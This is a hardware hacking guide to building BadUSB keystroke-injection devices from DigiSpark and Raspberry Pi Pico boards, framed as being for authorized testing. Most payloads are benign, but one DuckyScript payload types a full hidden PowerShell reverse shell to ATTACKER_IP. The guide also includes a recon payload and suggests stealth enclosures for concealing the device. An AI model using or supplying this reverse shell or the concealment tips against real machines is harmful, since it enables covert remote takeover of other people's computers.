# DIY BadUSB Setup Guide

## Building Your Own BadUSB Devices

This guide covers setting up DigiSpark and Raspberry Pi Pico as BadUSB devices for authorized security testing.

---

## DigiSpark ATtiny85 Setup

### Hardware Required

- DigiSpark ATtiny85 board (~$3-5)
- USB-A extension cable (optional, for testing)
- Computer with Arduino IDE

### Software Setup

#### 1. Install Arduino IDE

Download from: https://www.arduino.cc/en/software

#### 2. Add DigiSpark Board Support

1. Open Arduino IDE
2. Go to File → Preferences
3. Add to "Additional Boards Manager URLs":
   ```
   http://digistump.com/package_digistump_index.json
   ```
4. Go to Tools → Board → Boards Manager
5. Search "Digistump AVR Boards"
6. Install

#### 3. Install Drivers (Windows)

Download and run: https://github.com/digistump/DigistumpArduino/releases

### Programming DigiSpark

#### Basic Payload Structure

```cpp
#include "DigiKeyboard.h"

void setup() {
  // Wait for USB enumeration
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);

  // Your payload here
}

void loop() {
  // Empty - run once only
}
```

#### Key Code Reference

```cpp
// Modifier Keys
MOD_CONTROL_LEFT   // Left Ctrl
MOD_SHIFT_LEFT     // Left Shift
MOD_ALT_LEFT       // Left Alt
MOD_GUI_LEFT       // Windows/Cmd key

// Common Keys
KEY_ENTER          // Enter
KEY_TAB            // Tab
KEY_ESCAPE         // Escape
KEY_SPACE          // Space
KEY_BACKSPACE      // Backspace
KEY_DELETE         // Delete

// Function Keys
KEY_F1 through KEY_F12

// Arrow Keys
KEY_ARROW_UP, KEY_ARROW_DOWN
KEY_ARROW_LEFT, KEY_ARROW_RIGHT

// Letters
KEY_A through KEY_Z
```

#### Example Payloads

**Open Notepad (Windows)**
```cpp
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);

  // Win+R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Type notepad
  DigiKeyboard.print("notepad");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Type message
  DigiKeyboard.print("Hello from DigiSpark!");
}

void loop() {}
```

**Open Terminal (Linux)**
```cpp
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);

  // Ctrl+Alt+T
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);

  // Type command
  DigiKeyboard.print("echo 'Hello from DigiSpark!'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
```

### Uploading to DigiSpark

1. Write your code in Arduino IDE
2. Click Upload (DO NOT plug in DigiSpark yet)
3. Wait for "Plug in device now" message
4. Plug in DigiSpark within 60 seconds
5. Wait for upload to complete

### Troubleshooting

| Issue | Solution |
|-------|----------|
| Device not recognized | Install drivers, try different USB port |
| Upload timeout | Unplug, click upload, plug in quickly |
| Keys not working | Check keyboard layout, adjust delays |
| Wrong characters | May need keyboard layout library |

---

## Raspberry Pi Pico Setup (Pico Ducky)

### Hardware Required

- Raspberry Pi Pico (~$4)
- Micro-USB cable
- Computer for programming

### Method 1: Pico-Ducky (CircuitPython)

#### 1. Install CircuitPython

1. Download UF2 file from: https://circuitpython.org/board/raspberry_pi_pico
2. Hold BOOTSEL button on Pico
3. Plug into computer while holding button
4. Pico appears as RPI-RP2 drive
5. Drag UF2 file to drive
6. Pico reboots as CIRCUITPY

#### 2. Install Pico-Ducky

1. Download from: https://github.com/dbisu/pico-ducky
2. Extract all files to CIRCUITPY drive
3. Required files:
   - `code.py`
   - `duckyinpython.py`
   - `wsgi.py` (optional for WebUI)
   - `adafruit_hid/` folder
   - `payload.dd` (your payload)

#### 3. Create Payload

Create `payload.dd` on CIRCUITPY drive:

```
REM Pico Ducky Test Payload
DELAY 2000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000
STRING Hello from Pico Ducky!
ENTER
```

#### 4. Run Payload

- Unplug and replug Pico
- Payload executes automatically

### Method 2: Pico-Keyboard (Faster)

#### 1. Flash Firmware

1. Download Pico-Keyboard UF2
2. Flash as above

#### 2. Create Payload

Payloads use standard DuckyScript format.

### Payload Examples

**Windows Reverse Shell**
```
REM Windows PowerShell Reverse Shell
DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500
STRING $client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
ENTER
```

**Linux Recon**
```
REM Linux System Recon
DELAY 2000
CTRL ALT t
DELAY 1000
STRING uname -a && id && ip a
ENTER
DELAY 500
STRING exit
ENTER
```

**macOS Terminal**
```
REM macOS Open Terminal
DELAY 2000
GUI SPACE
DELAY 500
STRING Terminal
DELAY 500
ENTER
DELAY 1000
STRING echo "Hello from Pico Ducky!"
ENTER
```

### Multiple Payloads

Create multiple `.dd` files and switch by renaming:
```
payload.dd       ← Active payload
payload2.dd
payload3.dd
```

Or use WebUI (if configured) to select payloads.

### Stealth Enclosure Ideas

| Method | Stealth Level | Difficulty |
|--------|---------------|------------|
| 3D printed USB case | High | Medium |
| Gutted USB hub | High | Easy |
| Inside keyboard | Very High | Hard |
| Inside USB charger | High | Medium |

---

## DuckyScript to Arduino Converter

### Online Converters

- https://seytonic.com/ducky2arduino
- https://d4n5h.github.io/Duckuino/

### Manual Conversion Reference

| DuckyScript | Arduino |
|-------------|---------|
| `DELAY 1000` | `DigiKeyboard.delay(1000);` |
| `STRING text` | `DigiKeyboard.print("text");` |
| `ENTER` | `DigiKeyboard.sendKeyStroke(KEY_ENTER);` |
| `GUI r` | `DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);` |
| `CTRL ALT DEL` | `DigiKeyboard.sendKeyStroke(KEY_DELETE, MOD_CONTROL_LEFT \| MOD_ALT_LEFT);` |

---

## Safety & Best Practices

### Testing

1. Always test on YOUR OWN systems first
2. Use a VM when possible
3. Have a way to interrupt (quick unplug)
4. Start with safe payloads (notepad, echo)

### Delays

- Too fast = commands fail
- Too slow = obvious to user
- Standard starting delays:
  - After GUI r: 500ms
  - After launching app: 1000-2000ms
  - Between commands: 100-200ms

### Common Mistakes

| Mistake | Solution |
|---------|----------|
| Payload runs immediately | Add initial delay |
| Wrong characters typed | Check keyboard layout |
| Commands fail | Increase delays |
| Payload doesn't run | Check file naming |

---

## Resources

- **DigiSpark**: https://digistump.com/wiki/digispark
- **Pico Ducky**: https://github.com/dbisu/pico-ducky
- **DuckyScript Docs**: https://docs.hak5.org/hak5-usb-rubber-ducky
- **Keyboard HID Codes**: https://www.usb.org/hid

---

[← Back to Main](../README.md)
